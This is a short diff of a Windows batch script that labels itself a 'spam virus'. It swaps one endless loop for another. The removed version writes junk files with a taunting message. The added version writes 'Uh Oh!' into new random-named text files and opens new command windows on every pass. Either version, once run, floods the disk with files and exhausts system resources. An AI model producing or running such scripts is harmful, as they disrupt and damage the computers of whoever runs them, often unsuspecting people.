@@ -1,5 +1,5 @@
 @echo off
-:loop
-echo YOU HAVE RUNNED A SPAM VIRUS >
-ETHERAONTOP%random%
-goto loop
+:uhoh
+echo Uh Oh! > UhOh%random%.txt
+start
+goto uhoh
